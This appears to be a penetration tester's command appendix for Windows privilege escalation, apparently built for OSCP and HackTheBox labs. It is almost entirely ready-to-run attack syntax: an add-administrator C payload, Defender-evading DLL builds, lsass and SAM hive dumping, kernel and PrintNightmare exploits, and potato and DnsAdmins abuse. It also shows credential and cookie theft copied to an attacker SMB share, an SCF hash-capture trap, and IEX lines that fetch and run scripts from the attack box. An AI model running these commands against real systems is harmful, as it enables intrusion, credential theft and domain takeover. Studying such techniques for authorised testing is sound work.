# Windows Privilege Escalation, Command Appendix

Part of [[COMMAND APPENDIX]]. Exact syntax for Module 17 techniques. Phase-by-phase methodology: [[Windows Methodology#Phase 3: Privilege Escalation|Windows Methodology Phase 3]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]]. Full technique writeups with lab walkthroughs: [[Windows Privilege Escalation]].

---

## Situational Awareness

```powershell
# Token, groups, privileges
whoami /all
whoami /priv
whoami /groups

# Local users and groups
net user
net localgroup
net localgroup Administrators
net user <username>

# System info
systeminfo
hostname

# Network
ipconfig /all
route print
netstat -ano

# Processes
tasklist /v
Get-Process | Select-Object Name,Id,Path | Sort-Object Name

# Services
wmic service get name,displayname,pathname,startmode
sc.exe query type= all state= all
Get-CimInstance -Class Win32_Service | Select-Object Name,State,PathName,StartName

# Installed software
wmic product get name,version
Get-CimInstance -Class Win32_InstalledWin32Program | Select-Object Name,Version

# Installed patches
wmic qfe list
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID
```

---

## Sensitive Info Hunting

```powershell
# PSReadLine command history (typed credentials often end up here)
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
# All users (needs read access to their profiles):
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content

# Transcript files
Get-ChildItem C:\Users\*\Documents\PowerShell* -Recurse -ErrorAction SilentlyContinue
Get-ChildItem "C:\Windows\system32" -Filter "*transcript*" -ErrorAction SilentlyContinue

# Files containing passwords
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret" -ErrorAction SilentlyContinue

# Desktop and Documents text files
Get-ChildItem C:\Users\*\Desktop\*.txt -ErrorAction SilentlyContinue | Get-Content
Get-ChildItem "C:\Users\*\Documents\*.txt" -ErrorAction SilentlyContinue | Get-Content

# Saved credentials / credential manager
cmdkey /list

# Registry AutoLogon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# DPAPI masterkeys (Seatbelt finds these)
.\Seatbelt.exe DpapiMasterKeys

# Interesting file types
Get-ChildItem -Path C:\Users\ -Recurse -Include *.kdbx,*.rdg,*.vnc,*.rdp,*.cred,*.bak -ErrorAction SilentlyContinue
```

---

## Automated Enumeration

```powershell
# winPEAS
iwr -uri http://<kali-ip>/winPEASx64.exe -OutFile winPEAS.exe
.\winPEAS.exe | Tee-Object -FilePath winpeas_out.txt

# PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1')
Invoke-AllChecks
# Individual checks:
Get-ModifiableServiceFile     # binary is writable
Get-UnquotedService           # unquoted path + writable dir
Get-ModifiableService         # service config writable (binPath)

# Seatbelt
iwr -uri http://<kali-ip>/Seatbelt.exe -OutFile Seatbelt.exe
.\Seatbelt.exe -group=all
.\Seatbelt.exe DpapiMasterKeys InstalledProducts PowerShellHistory
```

---

## Service Binary Hijacking

```powershell
# Check ACLs on a service binary
icacls "C:\Path\to\service.exe"
# Target perms: BUILTIN\Users:(F), (W), or (M)

# Find the service binary path
wmic service where name="ServiceName" get pathname
(Get-CimInstance -Class Win32_Service -Filter "Name='ServiceName'").PathName
```

Payload (adduser.c), compile on Kali:
```bash
x86_64-w64-mingw32-gcc -o payload.exe adduser.c -ladvapi32
```
```c
#include <stdlib.h>
int main() {
    system("net user hacker Passw0rd! /add");
    system("net localgroup Administrators hacker /add");
    return 0;
}
```

Restart trigger:
```cmd
sc.exe stop ServiceName
sc.exe start ServiceName
```
```powershell
Restart-Service ServiceName -Force
# Or via WMI:
(Get-WmiObject Win32_Service -Filter "Name='ServiceName'").StopService()
(Get-WmiObject Win32_Service -Filter "Name='ServiceName'").StartService()
```

---

## DLL Hijacking

```powershell
# Check if the service's directory is user-writable
icacls "C:\Path\to\service\dir\"
# BUILTIN\Users:(W) or (M) or (F) = can plant a DLL

# Check service log for 'Couldn't load' messages
type C:\Path\to\service\dir\ServiceName.log
```

Compile DLL payload on Kali (nostdlib = smaller, Defender-friendlier):
```bash
x86_64-w64-mingw32-gcc -shared -nostdlib -nostartfiles \
  -fno-stack-check -mno-stack-arg-probe \
  -Wl,--entry,DllMainCRTStartup \
  -o MissingDll.dll payload.c \
  -lkernel32 -ladvapi32
```

If the compile fails with `undefined reference to '___chkstk_ms'`: you forgot `-fno-stack-check -mno-stack-arg-probe`.

Check for DLL after upload (confirm not quarantined by Defender):
```powershell
Get-Item "C:\Path\to\service\dir\MissingDll.dll" | Select-Object Length,LastWriteTime
```

Read flag via SeBackupPrivilege (DLL payload, runs as Backup Operators service account):
```c
// FILE_FLAG_BACKUP_SEMANTICS bypasses ACL checks when SeBackupPrivilege is active
HANDLE hIn = CreateFileW(L"C:\\Target\\flag.txt",
    GENERIC_READ, FILE_SHARE_READ, NULL,
    OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
```

Dump SAM/SYSTEM hives (fallback when flag isn't directly readable):
```c
HKEY hSam;
RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", REG_OPTION_BACKUP_RESTORE, KEY_READ, &hSam);
RegSaveKeyExW(hSam, L"C:\\Temp\\cfg1.db", NULL, REG_NO_COMPRESSION);
```

---

## Unquoted Service Path

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```
```powershell
Get-UnquotedService   # PowerUp
Get-CimInstance -Class Win32_Service | Where-Object {$_.PathName -match ' ' -and $_.PathName -notmatch '"'} | Select-Object Name,PathName
```

Check which component directory is writable:
```powershell
icacls "C:\Program Files\Vuln App\"
# If writable: plant payload at the first space-ambiguous component
# e.g. path is C:\Program Files\Vuln App\service.exe
# → plant C:\Program Files\Vuln.exe (Windows tries this first)
```

```cmd
sc start ServiceName
```

---

## Scheduled Tasks

```powershell
# Full task list
schtasks /query /fo LIST /v

# PowerShell - filter out system tasks, find non-standard users
Get-ScheduledTask | Where-Object {$_.Principal.UserId -notin @("SYSTEM","LOCAL SERVICE","NETWORK SERVICE","Users","Administrators","INTERACTIVE")} | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="Args";E={$_.Actions.Arguments}},@{N="User";E={$_.Principal.UserId}},@{N="Next";E={(Get-ScheduledTaskInfo $_).NextRunTime}}

# Check a specific task's binary ACL
icacls "C:\Path\to\task\binary.exe"

# Check task next run time
(Get-ScheduledTaskInfo -TaskName "TaskName").NextRunTime
```

Replace writable binary with reverse shell payload, wait for task to fire.

---

## Service DACL / Restart Rights

```cmd
# Read service DACL (shows who has start/stop rights)
sc sdshow ServiceName
# SDDL RP = SERVICE_START, WP = SERVICE_STOP
# RID in parentheses: Get-LocalUser | Where-Object {$_.SID -match '1003$'}

# Check service failure actions (will it auto-restart?)
sc qfailure ServiceName
```

---

## Kernel Exploits (OSCP-era)

```powershell
# Check patch level
Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID | Select-Object HotFixID,InstalledOn
```

**CVE-2023-29360** (KB5027215 absent):
```powershell
# Needs RDP for interactive shell, or pass command arg:
.\CVE-2023-29360.exe   # spawns SYSTEM cmd.exe interactively
.\CVE-2023-29360.exe "cmd.exe /c net user hacker Passw0rd! /add"
```

**CVE-2023-28252 (bkstephen)** (KB5025221 / KB5025224 absent):
```cmd
# Pass a command to run as SYSTEM (write output to file for non-interactive shells)
clfs_eop.exe "cmd.exe /c whoami > C:\Temp\out.txt"
clfs_eop.exe "cmd.exe /c type C:\Users\target\Desktop\flag.txt > C:\Temp\flag.txt"
type C:\Temp\flag.txt
```
Note: needs write access to `C:\Users\Public\`. If denied over WinRM, try from a different shell context (nc bind shell, reverse shell).

---

## SeImpersonatePrivilege

```powershell
whoami /priv   # confirm SeImpersonatePrivilege Enabled

# SigmaPotato (modern, no CLSID needed, works Win10/11/2019/2022)
iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
.\SigmaPotato.exe "net user hacker Passw0rd! /add"
.\SigmaPotato.exe "net localgroup Administrators hacker /add"

# Then connect as hacker:
evil-winrm -i <target-ip> -u hacker -p Passw0rd!
```

---

## SeBackupPrivilege (Backup Operators)

```powershell
whoami /groups   # BUILTIN\Backup Operators

# Dump SAM and SYSTEM hives for offline cracking
reg save HKLM\SAM C:\Temp\sam.bak /y
reg save HKLM\SYSTEM C:\Temp\system.bak /y
# Download to Kali:
download C:\Temp\sam.bak   # evil-winrm
download C:\Temp\system.bak

# Crack offline:
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

---

## AlwaysInstallElevated

```powershell
# Both keys must be 1 for exploit to work
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```
```bash
# Generate payload on Kali
msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o shell.msi
python3 -m http.server 8080
```
```cmd
msiexec /quiet /qn /i \\<kali-ip>\share\shell.msi
# Or after downloading:
msiexec /quiet /qn /i C:\Temp\shell.msi
```

---

---

## AppLocker Enumeration (HTB Supplementary)

```powershell
# See all effective rules (allows and denies)
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Export to XML for offline review
Get-AppLockerPolicy -Effective -Xml

# Check which rules deny a specific binary
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | Where-Object {$_.Action -eq 'Deny'}
```

Key fields: `PathConditions` = the blocked path, `Action = Deny` = blocked, `UserOrGroupSid = S-1-1-0` = applies to Everyone.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.1. Situational Awareness|WPE.1]].

#### Tags: #AppLocker #Enumeration #WindowsPrivesc

---

## Named Pipe ACL Inspection (HTB Supplementary)

```cmd
:: List all named pipes
accesschk.exe -accepteula -w \pipe\* -v 2>nul

:: Check specific pipe
accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v

:: What to look for:
:: WRITE_DAC → modify the pipe's ACL (then grant yourself access)
:: FILE_ALL_ACCESS → full control
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.3. Communication with Processes (Named Pipes)|WPE.3]].

#### Tags: #NamedPipe #AccessChk #WindowsPrivesc

---

## SeDebugPrivilege — lsass Dump (HTB Supplementary)

```cmd
:: Step 1: dump lsass (requires elevated CMD — SeDebugPrivilege may show Disabled, still works)
cd C:\Tools\Procdump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

:: Step 2: parse dump with Mimikatz
copy lsass.dmp C:\Tools\Mimikatz\x64\
cd C:\Tools\Mimikatz\x64\
mimikatz.exe
```

Inside Mimikatz:

```
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
:: Look for: * NTLM : <hash> under each user's entry
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.5. SeDebugPrivilege|WPE.5]], [[Password Attacks#Mimikatz|Mimikatz appendix]].

#### Tags: #SeDebugPrivilege #lsass #Mimikatz #CredentialDump #WindowsPrivesc

---

## SeTakeOwnershipPrivilege (HTB Supplementary)

```powershell
:: Enable the privilege (it may show Disabled in whoami /priv)
cd C:\Tools
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1

:: Take ownership of the file
takeown /f 'C:\path\to\file.txt'

:: Grant yourself read/write (ownership alone doesn't give read access)
icacls 'C:\path\to\file.txt' /grant <username>:F

:: Read the file
cat 'C:\path\to\file.txt'
```

High-value targets: `C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SYSTEM`, any protected file.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.6. SeTakeOwnershipPrivilege|WPE.6]].

#### Tags: #SeTakeOwnershipPrivilege #takeown #icacls #WindowsPrivesc

---

## SeLoadDriverPrivilege — Capcom Exploit (HTB Supplementary)

Requires Print Operators group membership (which grants SeLoadDriverPrivilege).

```cmd
:: Step 1: EoPLoadDriver enables privilege, creates registry key, loads driver
cd C:\Tools
EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
:: Expected: [+] SeLoadDriverPrivilege Enabled; NTSTATUS: 00000000

:: Step 2: use the loaded driver to steal SYSTEM token
cd \Tools\ExploitCapcom
ExploitCapcom.exe
:: Expected: [+] Token stealing was successful; [+] The SYSTEM shell was launched
:: A new CMD window opens as SYSTEM
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.10. Print Operators (SeLoadDriverPrivilege)|WPE.10]].

#### Tags: #SeLoadDriverPrivilege #PrintOperators #Capcom #EoPLoadDriver #WindowsPrivesc

---

## Event Log Readers — Credential Mining (HTB Supplementary)

```powershell
:: Confirm membership
net localgroup "Event Log Readers"

:: Search Security log for cleartext credentials (process creation audit events)
wevtutil qe Security /rd:true /f:text | Select-String "/user"

:: Also useful:
wevtutil qe Security /rd:true /f:text | Select-String "password"

:: Filter by Event ID 4688 (Process Creation with command line logging)
wevtutil qe Security /rd:true /f:text /q:"*[System[EventID=4688]]" | Select-String "/pass"
```

Look for: `net use /user:<user> <pass>`, `cmdkey /add: /user: /pass:`, `runas /user: ...`.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.8. Event Log Readers|WPE.8]].

#### Tags: #EventLogReaders #wevtutil #CredentialHunting #WindowsPrivesc

---

## DnsAdmins — Malicious DLL Injection (HTB Supplementary)

```bash
# Step 1: craft a DLL payload on attack box
msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll
python3 -m http.server 7777
```

```cmd
:: Step 2: on target (as DnsAdmins member), download and load the DLL
wget "http://PWNIP:7777/adduser.dll" -outfile "adduser.dll"
dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\adduser.dll

:: Step 3: restart DNS to trigger DLL load (service may fail to start — payload still runs)
sc stop dns
sc start dns

:: Step 4: verify Domain Admin membership
net group "Domain Admins" /dom
```

Then re-authenticate (sign out + RDP back in) to get the new group token.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.9. DnsAdmins Group|WPE.9]].

#### Tags: #DnsAdmins #dnscmd #DLLInjection #WindowsPrivesc

---

## Server Operators — Service Binary Path Hijack (HTB Supplementary)

```cmd
:: Step 1: find a service running as LocalSystem
sc qc AppReadiness
:: Confirms: SERVICE_START_NAME : LocalSystem

:: Step 2: change its binary to a command that adds your user to local Admins
sc config AppReadiness binPath= "cmd /c net localgroup Administrators <user> /add"

:: Step 3: start the service (will fail with 1053 — expected, payload still runs)
sc start AppReadiness

:: Step 4: verify local admin membership
net localgroup Administrators

:: Step 5: sign out and reconnect — now have local admin token
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.11. Server Operators|WPE.11]].

#### Tags: #ServerOperators #ServiceConfigHijack #WindowsPrivesc

---

## Credential Hunting — Windows-Specific Sources (HTB Supplementary)

```powershell
## findstr sweep (config files)
cd C:\Users
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

## Sticky Notes (plum.sqlite) — requires PSSQLite module
$db = 'C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Import-Module C:\Tools\PSSQLite\PSSQLite.psd1
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

## Get-LocalUser Description field (passwords stored in description)
Get-LocalUser

## Windows Credential Manager saved credentials
cmdkey /list

## unattend.xml (provisioning credentials)
type C:\Windows\Panther\unattend.xml
findstr /si "password" C:\Windows\Panther\*.xml

## PSReadLine history (PowerShell command history)
cat (Get-PSReadlineOption).HistorySavePath

## Registry credential hunting
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.16. Credential Hunting|WPE.16]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.17. Other Files (Sticky Notes, plum.sqlite)|WPE.17]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.22. Miscellaneous Techniques|WPE.22]].

#### Tags: #CredentialHunting #findstr #StickyNotes #unattendxml #WindowsPrivesc

---

## LaZagne, SharpChrome, SessionGopher (HTB Supplementary)

```powershell
## LaZagne — multi-source credential dump (browsers, DB clients, WinSCP, etc.)
.\lazagne.exe all

## SharpChrome — decrypt Chrome saved passwords (DPAPI, current user)
.\SharpChrome.exe logins /unprotect

## SessionGopher — WinSCP, PuTTY, RDP saved sessions
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target <hostname>
# For local only: Invoke-SessionGopher -Thorough
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.18. Further Credential Theft|WPE.18]].

#### Tags: #LaZagne #SharpChrome #SessionGopher #CredentialDump #WindowsPrivesc

---

## mRemoteNG — Decrypt Saved Passwords (HTB Supplementary)

```powershell
## Find config file
cmd /c more "%USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml"
## Look for: Password="<base64-blob>"
```

```bash
# Decrypt on attack box (default: no master password)
python3 mremoteng_decrypt.py -s "<base64-blob>"

# With custom master password:
python3 mremoteng_decrypt.py -s "<base64-blob>" -p "<masterpassword>"
```

Source: `https://github.com/haseebT/mRemoteNG-Decrypt`

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].

#### Tags: #mRemoteNG #CredentialDecrypt #Pillaging #WindowsPrivesc

---

## Firefox Cookie Theft — Session Hijacking (HTB Supplementary)

```cmd
:: Copy Firefox cookie database from victim to attacker SMB share
copy "C:\Users\<victim>\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite" \\PWNIP\share\
```

```bash
# On attack box: extract session cookie for target domain
python3 cookieextractor.py --dbpath cookies.sqlite --host <domain>
# Output: cookie name and value
```

Then in the victim's browser: Cookie-Editor extension → find the cookie by name → replace value → save → refresh.

Source: `https://github.com/juliourena/plaintext/blob/master/Scripts/cookieextractor.py`

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].

#### Tags: #CookieTheft #Firefox #SessionHijacking #Pillaging #WindowsPrivesc

---

## Restic Backup — SAM/SYSTEM Extraction (HTB Supplementary)

```powershell
## List snapshots (check for Windows\System32\config backups)
restic.exe -r E:\restic snapshots
# Enter repo password when prompted

## Restore a specific snapshot
restic.exe -r E:\restic restore <snapshot-id> --target C:\Users\<user>\Restore

## Copy hive files to attacker SMB share
copy C:\Users\<user>\Restore\C\Windows\System32\config\SAM \\PWNIP\share\
copy C:\Users\<user>\Restore\C\Windows\System32\config\SYSTEM \\PWNIP\share\
```

```bash
# Dump hashes offline
impacket-secretsdump -sam SAM -system SYSTEM local
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.21. Pillaging|WPE.21]].

#### Tags: #Restic #BackupExtraction #SecretsDump #Pillaging #WindowsPrivesc

---

## SCF File Attack — Responder Hash Capture (HTB Supplementary)

```
# SCF file content (save as @Inventory.scf in a shared folder)
[Shell]
Command=2
IconFile=\\PWNIP\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# Start Responder before placing the file
sudo responder -w -v -I tun0

# Crack the captured NTLMv2 hash
hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Key: `@` prefix sorts the file first alphabetically so it loads the moment the folder is opened in Explorer. The NTLMv2 hash captures the opener's credentials.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.20. Interacting with Users (SCF File Attack)|WPE.20]], [[Secrets & Credentials#Responder|Responder appendix]].

#### Tags: #SCFAttack #Responder #NetNTLMv2 #UserInteraction #WindowsPrivesc

---

## CVE-2021-36934 (HiveNightmare / SeriousSAM) (HTB Supplementary)

Affects Windows 10 builds 1809 through 21H1. VSS shadow copies of SAM/SYSTEM/SECURITY are world-readable.

```powershell
:: Use pre-compiled PoC (C:\Tools\CVE-2021-36934.exe)
.\CVE-2021-36934.exe
:: Output: SAM hashes for all local users including Administrator
```

```bash
# PtH with the NTLM hash
smbclient -U administrator '\\STMIP\C$' --pw-nt-hash
# Enter NTLM hash as password (NT portion only, not full string)
```

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.14. Kernel Exploits (HiveNightmare / CVE-2021-36934)|WPE.14]].

#### Tags: #HiveNightmare #CVE202136934 #SeriousSAM #KernelExploit #WindowsPrivesc

---

## PrintNightmare CVE-2021-1675 (HTB Supplementary)

```bash
# Prep PoC on attack box (add the invoke line at the bottom of the PS1)
git clone https://github.com/calebstewart/CVE-2021-1675.git
echo 'Invoke-Nightmare -NewUser "Hacker" -NewPassword "Pwnd1234!" -DriverName "Printyboi"' >> CVE-2021-1675.ps1
python3 -m http.server 8080
```

Delivery via command injection or any code execution:

```powershell
IEX(New-Object Net.Webclient).downloadString('http://PWNIP:8080/CVE-2021-1675.ps1')
# Creates Hacker:Pwnd1234! with local admin rights
```

Also works via authenticated SMB as a domain or local user with a Spooler service.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.25. Skills Assessment Part I|WPE.25]].

#### Tags: #PrintNightmare #CVE20211675 #SpoolerAbuse #WindowsPrivesc

---

## Sherlock.ps1 / Windows-Exploit-Suggester (Old OS) (HTB Supplementary)

```powershell
## Sherlock — PowerShell-based missing patch check (Windows 7/2008 era)
Import-Module .\Sherlock.ps1
Find-AllVulns
## Look for: VulnStatus: Appears Vulnerable
```

```bash
## Windows-Exploit-Suggester — takes systeminfo output, cross-references MS patch DB
# Update database (generates YYYY-MM-DD-mssb.xls)
python2 windows-exploit-suggester.py --update

# Run against captured systeminfo output
python2 windows-exploit-suggester.py --database YYYY-MM-DD-mssb.xls --systeminfo sysinfo.txt
# Flags: [E] = exploitdb PoC, [M] = Metasploit module
```

Key old-OS exploits:

| Bulletin | CVE | Target | Tool |
|----------|-----|--------|------|
| MS10-092 | 2010-3338 | Win 7/2008 R2 | MSF `windows/local/ms10_092_schelevator` |
| MS16-032 | 2016-0099 | Win 7-10 | Invoke-MS16-032.ps1 (GitHub) |
| CVE-2021-36934 | HiveNightmare | Win10 1809-21H1 | CVE-2021-36934.exe |

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.23. Windows Server (Old OS)|WPE.23]], [[Windows Privilege Escalation (HTB Supplementary)#WPE.24. Windows Desktop (Old OS)|WPE.24]].

#### Tags: #Sherlock #WindowsExploitSuggester #OldOS #MS10092 #MS16032 #WindowsPrivesc

---

## PwDump8 — Local Hash Extraction (HTB Supplementary)

```cmd
:: Run as SYSTEM or local admin
C:\path\to\pwdump8.exe
:: Output: username:RID:LM_hash:NTLM_hash (CSV format)
:: LM portion is always aad3b435b51404eeaad3b435b51404ee (empty) on modern Windows
```

```bash
# Crack NTLM hashes offline
hashcat -m 1000 <ntlm_hash> /usr/share/wordlists/rockyou.txt
```

Alternative when you have SYSTEM meterpreter: `hashdump` built-in.

See [[Windows Privilege Escalation (HTB Supplementary)#WPE.26. Skills Assessment Part II|WPE.26]], [[Password Attacks#SAM offline dump|SAM offline dump]].

#### Tags: #PwDump8 #HashDump #LocalHashes #WindowsPrivesc

---

---

## SysaxAutomation Privilege Escalation

SysaxAutomation is a Windows automation tool with a service running as SYSTEM. If the current user can create or modify a file-triggered task, the task's payload runs as SYSTEM.

**Detection:** Look for `sysaxschedscp.exe` in running processes or installed applications.

**Exploitation (requires access to sysaxschedscp.exe — even a low-priv user can add tasks):**

1. Create a batch payload in a writable directory (e.g., `%USERPROFILE%\Documents\pwn.bat`):

```cmd
net localgroup administrators <USERNAME> /add
```

2. Open `sysaxschedscp.exe` → Setup Scheduled/Triggered Tasks → Add task (Triggered).
3. Set:
   - Folder to Monitor: a directory the current user controls (e.g., `C:\Users\<user>\Documents\`)
   - Check: "Run task if a file is added to the monitor folder or subfolder(s)"
   - Program to run: full path to `pwn.bat`
   - Uncheck "Login as the following user to run task" (runs as SYSTEM if unchecked)
4. Click Finish.
5. Create any new file in the monitored folder to trigger the task.
6. Confirm with `net localgroup administrators`.

**Alternative payloads instead of net localgroup:**
- Add an SSH authorized_keys entry for persistence
- Execute a reverse shell: `cmd /c powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://PWNIP/shell.ps1')"`

See [[Attacking Enterprise Networks (HTB Supplementary)#AEN.8. Lateral Movement|AEN.8 Q3]] for the full example.

#### Tags: #SysaxAutomation #FileTriggeredTask #WindowsPrivesc #ScheduledTasks #HTBSupplementary

---

#### Tags: #WindowsPrivesc #CommandAppendix #Module17 #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #ScheduledTasks #KernelExploit #SeImpersonatePrivilege #SeBackupPrivilege #winPEAS #PowerUp #SigmaPotato #CVE202328252 #CVE202329360 #SeDebugPrivilege #SeTakeOwnershipPrivilege #SeLoadDriverPrivilege #AppLocker #DnsAdmins #ServerOperators #EventLogReaders #HiveNightmare #PrintNightmare #CredentialHunting #mRemoteNG #SCFAttack #LaZagne #SharpChrome #SessionGopher #Restic #Pillaging #SysaxAutomation #HTBSupplementary
